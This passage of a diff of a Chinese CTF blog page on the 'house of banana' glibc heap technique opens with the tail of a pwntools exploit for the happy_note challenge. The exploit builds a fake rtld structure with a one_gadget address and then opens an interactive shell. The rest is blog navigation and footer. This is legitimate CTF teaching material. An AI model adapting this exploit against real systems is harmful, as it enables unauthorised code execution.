b&#x27;\x00&#x27;)</span><br><span class="line">payload += p64(fake_rtld + 0x58)</span><br><span class="line">payload += p64(0x8)</span><br><span class="line">payload += p64(ogg)</span><br><span class="line">payload = payload.ljust(0x100, b&#x27;\x00&#x27;)</span><br><span class="line">payload += p64(fake_rtld + 0x40)</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(fake_rtld + 0x48)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(4, payload)</span><br><span class="line">edit(8, b&#x27;\x00&#x27; * (0x12c - 0x10) + p8(8))</span><br><span class="line">delete(10)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2022-08-24 22:45:14" itemprop="dateModified" datetime="2022-08-24T22:45:14+08:00">2022-08-24</time>
+  </span>
+</div>
+
       
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="John Doe WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="John Doe Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="John Doe PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>John Doe <i class="ic i-at"><em>@</em></i>Hexo
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="http://wscyoulin.github.io/2022/08/22/house-of-banana/" title="house_of_banana">http://wscyoulin.github.io/2022/08/22/house-of-banana/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2022/08/21/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giciundwu5j20zk0m8n9e.jpg" title="巅峰极客复现">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>巅峰极客复现</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2022/08/28/debug%E4%BF%A1%E6%81%AF%E4%BF%AE%E6%94%B9/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipetlbztpj20zk0m84qp.jpg" title="debug信息修改">
+  <span class="type">Next Post</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>debug信息修改</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%B0%E7%89%88glibc%E7%9A%84%E6%94%B9%E8%BF%9B"><span class="toc-number">1.</span> <span class="toc-text">新版glibc的改进</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-large-bin-attack%E5%9C%A8%E6%96%B0%E7%89%88glibc%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text">0x03 large bin attack在新版glibc中的利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-banana"><span class="toc-number">2.</span> <span class="toc-text">house of banana</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF%EF%BC%88%E6%BB%A1%E8%B6%B3%E4%BB%BB%E4%B8%80%E6%9D%A1%E4%BB%B6%E5%8D%B3%E5%8F%AF%EF%BC%89%EF%BC%9A"><span class="toc-number">2.0.1.</span> <span class="toc-text">适用场景（满足任一条件即可）：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%A8%8B%E5%BA%8F%E8%83%BD%E5%A4%9F%E6%98%BE%E5%BC%8F%E7%9A%84%E6%89%A7%E8%A1%8Cexit%E5%87%BD%E6%95%B0"><span class="toc-number">2.0.1.1.</span> <span class="toc-text">1.程序能够显式的执行exit函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%A8%8B%E5%BA%8F%E9%80%9A%E8%BF%87libc-start-main%E5%90%AF%E5%8A%A8%E7%9A%84%E4%B8%BB%E5%87%BD%E6%95%B0%EF%BC%8C%E4%B8%94%E4%B8%BB%E5%87%BD%E6%95%B0%E8%83%BD%E5%A4%9F%E7%BB%93%E6%9D%9F"><span class="toc-number">2.0.1.2.</span> <span class="toc-text">2.程序通过libc_start_main启动的主函数，且主函数能够结束</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-number">2.0.2.</span> <span class="toc-text">原理分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-banana-1"><span class="toc-number">2.1.</span> <span class="toc-text">house of banana</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exit-gt-dl-fini-gt-fini-t-array-i"><span class="toc-number">2.2.</span> <span class="toc-text">exit -&gt; _dl_fini -&gt;((fini_t) array[i]) ();</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E6%B3%A8%E6%84%8F%E7%82%B9%EF%BC%9A"><span class="toc-number">2.3.</span> <span class="toc-text">一些注意点：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.4.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22022-happy-note"><span class="toc-number">3.</span> <span class="toc-text">例题：巅峰极客2022-happy_note</span></a></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="Related">
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="John Doe"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">John Doe</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">21</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2022/08/21/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2022/08/28/debug%E4%BF%A1%E6%81%AF%E4%BF%AE%E6%94%B9/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/07/io-file%E5%88%A9%E7%94%A8/" title="io_file利用">io_file利用</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/08/28/debug%E4%BF%A1%E6%81%AF%E4%BF%AE%E6%94%B9/" title="debug信息修改">debug信息修改</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/21/aarch64/" title="aarch64">aarch64</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/08/21/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/" title="巅峰极客复现">巅峰极客复现</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/01/16/%E6%80%BB%E7%BB%93/" title="总结">总结</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/14/house-of-cat/" title="house_of_cat">house_of_cat</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/04/10/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/" title="整数溢出">整数溢出</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/08/22/house-of-banana/" title="house_of_banana">house_of_banana</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/04/awd_pwn%E6%80%BB%E7%BB%93/" title="awd_pwn总结">awd_pwn总结</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/22/%E6%9F%8F%E9%B9%AD%E6%9D%AF/" title="柏鹭杯">柏鹭杯</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2022</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">John Doe @ Yume Shoka</span>
+  </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2022/08/22/house-of-banana/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)Booooom"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
